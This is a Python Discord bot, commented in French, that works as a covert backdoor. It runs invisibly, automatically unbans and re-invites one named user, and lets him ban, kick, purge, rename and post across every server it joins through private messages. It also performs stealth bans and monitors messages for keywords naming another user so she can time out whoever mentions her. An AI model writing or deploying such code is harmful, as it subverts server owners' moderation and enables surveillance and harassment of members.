import discord
from discord.ext import commands
import os
from flask import Flask
from threading import Thread
from datetime import timedelta

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.bans = True  # Nécessaire pour détecter les bans

bot = commands.Bot(command_prefix="!", intents=intents)

# Ton pseudo exact pour sécuriser les commandes
TARGET_USERNAME = "akz_92"
VICTIME_NAME = "m1zuki_1"
MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]

# Stockage temporaire pour les demandes de timeout
pending_timeouts = {}

# --- SERVEUR WEB POUR GARDER LE BOT ACTIF SUR RENDER ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot en ligne !"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Fonction utilitaire pour récupérer un serveur soit par son ID, soit par un lien/code d'invitation
async def get_guild_from_input(identifier):
    if identifier.isdigit():
        return bot.get_guild(int(identifier))
    try:
        code = identifier.split("/")[-1]
        invite = await bot.fetch_invite(code)
        return invite.guild
    except:
        return None

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.invisible)
    print(f"[OK] Bot connecté en tant que {bot.user}")
    print(f"[SURVEILLANCE] Cible principale : {TARGET_USERNAME} | Victime : {VICTIME_NAME}")

# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
@bot.event
async def on_member_update(before, after):
    if after.name == TARGET_USERNAME:
        role = discord.utils.get(after.guild.roles, name="Membre")
        if role and role not in after.roles:
            try:
                await after.add_roles(role)
            except:
                pass

# AUTO-UNBAN / RE-INVITATION : Si akz_92 se fait bannir, le bot le débanni et lui envoie une invite
@bot.event
async def on_member_ban(guild, user):
    if user.name == TARGET_USERNAME:
        try:
            await guild.unban(user, reason="Anti-ban automatique pour akz_92")
            
            invite = None
            for c in guild.text_channels:
                try:
                    invite = await c.create_invite(max_uses=1, max_age=300)
                    break
                except:
                    continue
            
            if invite:
                await user.send(f"🚨 Tu as été banni du serveur **{guild.name}**, je t'ai débanni et voici ton lien pour revenir : {invite.url}")
            else:
                await user.send(f"🚨 Tu as été banni de **{guild.name}** et je t'ai débanni, mais je n'ai pas pu créer d'invitation (permissions manquantes).")
        except Exception as e:
            print(f"Erreur lors de l'auto-unban de akz_92 : {e}")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # =========================================================================
    # 1. GESTION DES DM (Contrôle à distance pour akz_92 & Validation m1zuki_1)
    # =========================================================================
    if isinstance(message.channel, discord.DMChannel):
        
        # Gestion exclusive des réponses de m1zuki_1 en DM pour valider le timeout
        if message.author.name == VICTIME_NAME:
            content = message.content.lower().strip()
            if content in ["oui", "non"]:
                if message.author.id in pending_timeouts:
                    target_info = pending_timeouts[message.author.id]
                    target = target_info["target"]
                    guild = target_info["guild"]
                    
                    if content == "oui":
                        try:
                            # Application d'un timeout de 1 minute
                            await target.timeout(timedelta(minutes=1), reason="Timeout de 1 minute sur ordre de m1zuki_1")
                            await target.send(f"Tu dis mon prénom ? Calme-toi 1 minute ! @{message.author.name}")
                            await message.author.send(f"✅ L'utilisateur {target.name} a reçu un timeout de 1 minute sur le serveur {guild.name}.")
                        except Exception as e:
                            await message.author.send(f"❌ Impossible de mettre en timeout cette personne : {e}")
                    else:
                        await message.author.send("✅ Action annulée.")
                    
                    pending_timeouts.pop(message.author.id)
                else:
                    await message.author.send("Aucune cible en attente.")
            return

        if message.author.name != TARGET_USERNAME:
            return

        args = message.content.split()
        if not args: return
        cmd = args[0].lower()

        try:
            if cmd == "serveurs":
                txt = "\n".join([f"{g.name} (ID: {g.id})" for g in bot.guilds])
                await message.author.send(f"📋 Serveurs :\n{txt}")

            elif cmd == "liens":
                links_output = "🔗 **Liens d'invitation de tous les serveurs :**\n"
                for g in bot.guilds:
                    try:
                        invite = None
                        for c in g.text_channels:
                            try:
                                invite = await c.create_invite(max_uses=0, max_age=0)
                                break
                            except:
                                continue
                        if invite:
                            links_output += f"- **{g.name}** : {invite.url}\n"
                        else:
                            links_output += f"- **{g.name}** : ❌ Pas de permission\n"
                    except:
                        links_output += f"- **{g.name}** : ❌ Erreur\n"
                await message.author.send(links_output)

            elif cmd == "dire":
                target_channel = bot.get_channel(int(args[1]))
                await target_channel.send(" ".join(args[2:]))
                await message.author.send("✅ Envoyé.")

            elif cmd == "purge":
                channel = bot.get_channel(int(args[1]))
                deleted = await channel.purge(limit=int(args[2]))
                await message.author.send(f"✅ {len(deleted)} messages supprimés.")

            elif cmd == "ban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.ban(reason="Banni via DM")
                await message.author.send("✅ Utilisateur banni.")

            elif cmd == "unban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                user_obj = await bot.fetch_user(int(args[2]))
                await guild.unban(user_obj, reason="Débannissement via DM par akz_92")
                await message.author.send(f"✅ L'utilisateur {user_obj.name} a été débanni de {guild.name}.")

            elif cmd == "untimeout":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.timeout(None, reason="Timeout retiré via DM par akz_92")
                await message.author.send(f"✅ Le timeout de {member.name} a été retiré sur {guild.name}.")

            elif cmd == "kick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.kick()
                await message.author.send("✅ Utilisateur expulsé.")

            elif cmd == "role":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role = await guild.create_role(name=args[2])
                await message.author.send(f"✅ Rôle {role.name} créé.")

            elif cmd == "setrolename":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role_input = args[2]
                new_role_name = " ".join(args[3:])
                
                role = None
                if role_input.isdigit():
                    role = guild.get_role(int(role_input))
                if not role:
                    role = discord.utils.get(guild.roles, name=role_input)
                
                if not role:
                    await message.author.send("❌ Rôle introuvable.")
                    return
                
                await role.edit(name=new_role_name, reason="Renommé via DM par akz_92")
                await message.author.send(f"✅ Le rôle a été renommé en : {new_role_name}")

            elif cmd == "puissance":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                
                target_input = args[2]
                member = None
                if target_input.isdigit():
                    try:
                        member = await guild.fetch_member(int(target_input))
                    except:
                        pass
                if not member:
                    member = discord.utils.find(lambda m: m.name == target_input or m.display_name == target_input, guild.members)

                if not member:
                    await message.author.send(f"❌ Impossible de trouver l'utilisateur '{target_input}' sur ce serveur.")
                    return

                role = discord.utils.get(guild.roles, name="La puissance")
                if not role:
                    await message.author.send("❌ Le rôle 'La puissance' n'existe pas sur ce serveur.")
                    return

                await member.add_roles(role, reason="Attribué via la commande puissance par akz_92")
                await message.author.send(f"✅ Le rôle 'La puissance' a été attribué à {member.name} sur {guild.name}.")

            elif cmd == "nick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                await guild.me.edit(nick=args[2])
                await message.author.send("✅ Mon pseudo a été changé.")

            elif cmd == "setname":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                new_name = " ".join(args[2:])
                await guild.edit(name=new_name)
                await message.author.send(f"✅ Nom du serveur modifié : {new_name}")

            elif cmd == "setnick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                new_nickname = " ".join(args[3:])
                await member.edit(nick=new_nickname)
                await message.author.send(f"✅ Pseudo de {member.name} modifié.")

            elif cmd == "salon":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                channel_name = " ".join(args[2:])
                new_channel = await guild.create_text_channel(channel_name)
                await message.author.send(f"✅ Salon #{new_channel.name} créé (ID: {new_channel.id}).")

        except Exception as e:
            await message.author.send(f"❌ Erreur : {e}")
        return

    # =========================================================================
    # 2. SYSTEME DE SURVEILLANCE & COMMANDES SUR LES SERVEURS
    # =========================================================================
    if message.guild:
        # COMMANDE PUBLIQUE : !untoakz (utilisable par tout le monde pour enlever ton timeout)
        if message.content.strip().lower() == "!untoakz":
            try:
                akz_member = discord.utils.get(message.guild.members, name=TARGET_USERNAME)
                if akz_member:
                    await akz_member.timeout(None, reason="Commande publique !untoakz exécutée")
                    await message.channel.send(f"✅ Le timeout de **{TARGET_USERNAME}** a été retiré avec succès !")
                else:
                    await message.channel.send(f"❌ Impossible de trouver {TARGET_USERNAME} sur ce serveur.")
            except Exception as e:
                await message.channel.send(f"❌ Erreur lors du retrait du timeout : {e}")
            return

        # Surveillance m1zuki_1
        victime_obj = discord.utils.get(message.guild.members, name=VICTIME_NAME)
        pinged_victime = victime_obj in message.mentions if victime_obj else False

        if (any(mot.lower() in message.content.lower() for mot in MOTS_CLES) or pinged_victime) and message.author.name != VICTIME_NAME:
            if victime_obj:
                pending_timeouts[victime_obj.id] = {
                    "target": message.author,
                    "guild": message.guild
                }
                try:
                    await victime_obj.send(
                        f"🚨 **Cible verrouillée** 🚨\n"
                        f"L'utilisateur **{message.author.name}** (sur le serveur *{message.guild.name}*) a prononcé ton nom ou t'a mentionné[cite: 6].\n"
                        f"Voulez-vous lui donner un **timeout de 1 minute** ? Répondez **oui** ou **non**."
                    )
                except Exception as e:
                    print(f"Erreur envoi DM m1zuki_1 : {e}")

        # Commande .ban sur le serveur (Réservée à akz_92)
        if message.content.startswith(".ban") and message.author.name == TARGET_USERNAME:
            try:
                await message.delete()
            except:
                pass

            if message.mentions:
                target = message.mentions[0]
                if target.name == TARGET_USERNAME:
                    try:
                        await message.author.send("❌ Tu ne peux pas te bannir toi-même !")
                    except:
                        pass
                    return

                try:
                    await message.guild.ban(target, reason="Banni discrètement via .ban")
                except Exception as e:
                    try:
                        await message.author.send(f"❌ Erreur lors du ban furtif : {e}")
                    except:
                        pass

# Lancement du serveur web pour Render
keep_alive()

# Lancement sécurisé via la variable d'environnement
bot.run(os.getenv("TOKEN"))
